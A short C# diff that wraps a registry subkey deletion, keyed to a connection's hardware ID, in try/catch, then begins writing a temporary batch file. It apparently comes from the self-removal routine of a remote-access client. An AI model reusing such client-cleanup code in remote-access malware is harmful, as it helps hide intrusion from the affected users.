@@ -35,7 +35,11 @@ namespace Plugin.Handler
                 catch { }
             }
 
-            Registry.CurrentUser.CreateSubKey(@"", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteSubKey(Connection.Hwid);
+            try
+            {
+                Registry.CurrentUser.CreateSubKey(@"", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteSubKey(Connection.Hwid);
+            }
+            catch { }
 
             string batch = Path.GetTempFileName() + ".bat";
             using (StreamWriter sw = new StreamWriter(batch))
